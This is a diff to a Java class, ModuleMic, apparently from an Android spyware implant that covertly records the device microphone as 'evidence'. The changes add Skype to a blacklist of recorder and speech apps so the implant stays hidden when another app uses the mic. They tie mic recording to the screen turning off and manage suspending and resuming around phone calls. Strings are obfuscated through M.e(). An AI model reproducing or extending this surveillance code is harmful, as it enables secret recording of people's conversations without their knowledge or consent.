@@ -66,12 +66,13 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	 * The recorder.
 	 */
 	MediaRecorder recorder;
-
+	boolean recording=false;
 	boolean phoneListening;
 	private Observer<ProcessInfo> processObserver;
 
 	public Set<String> blacklist = new HashSet<String>();
 	private boolean allowResume = true;
+	private String whoStopLast;
 
 	public ModuleMic() {
 		super();
@@ -85,6 +86,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		addBlacklist(M.e("soundrecorder"));
 		addBlacklist(M.e("voicerecorder"));
 		addBlacklist(M.e("voicesearch"));
+		addBlacklist(M.e("com.skype.raider"));
 		addBlacklist(M.e("com.andrwq.recorder"));
 		if (android.os.Build.VERSION.SDK_INT > 20){
 			if(isSpeechRecognitionActivityPresented()){
@@ -95,6 +97,14 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 				}
 			}
 		}
+	}
+
+	public void setRecording(boolean recording) {
+		this.recording = recording;
+	}
+
+	public boolean isRecording() {
+		return recording;
 	}
 
 	/**
@@ -339,6 +349,15 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 
 	int index = 0;
 	byte[] unfinished = null;
+
+	public boolean isCallOngoing() {
+		return callOngoing;
+	}
+
+	public void setCallOngoing(boolean callOngoing) {
+		this.callOngoing = callOngoing;
+	}
+
 	private boolean callOngoing;
 
 	protected synchronized void saveRecorderEvidence() {
@@ -478,13 +497,13 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	public int notification(Call call) {
 		if (call.isOngoing()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): call incoming, suspend");//$NON-NLS-1$
+				Check.log(TAG + " (notification):OnGoing Call ");//$NON-NLS-1$
 			}
 			callOngoing = true;
 			suspend();
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): ");//$NON-NLS-1$
+				Check.log(TAG + " (notification):Stopping Call ");//$NON-NLS-1$
 			}
 			callOngoing = false;
 			resume();
@@ -493,7 +512,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	}
 
 	public int notification(Standby b) {
-		if (b.isScreenOff()) {
+		if (b.isScreenOff() && canRecordMic()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification) standby, resume mic");
 			}
@@ -533,9 +552,9 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 				return false;
 			}
 
-			if (ModuleCall.self() != null && (ModuleCall.self().isBooted()==false || ModuleCall.self().canRecord()) ) {
+			if (ModuleCall.self() != null && (ModuleCall.self().isBooted()==false ) ) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (canRecordMic) can't switch on mic because call is available");
+					Check.log(TAG + " (canRecordMic) can't switch on mic because call is available (booted,canRecord)"+"("+ModuleCall.self().isBooted()+","+ModuleCall.self().canRecord()+")");
 				}
 				return false;
 			}
@@ -594,11 +613,23 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		}
 	}
 
-	public void stop() {
+	public synchronized void stop(Object o) {
 		allowResume = false;
+		whoStopLast=o.getClass().getCanonicalName();
 		suspend();
 	}
-
+	public synchronized void restore(Object o) {
+		resetBlacklist();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (restore) last who stop is " + whoStopLast + " asking now is " + o.getClass().getCanonicalName());//$NON-NLS-1$
+		}
+		if(whoStopLast==o.getClass().getCanonicalName()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (restore) allow resume cos last stop is " + whoStopLast);//$NON-NLS-1$
+			}
+			allowResume = true;
+		}
+	}
 	@Override
 	public String getTag() {
 		return TAG;
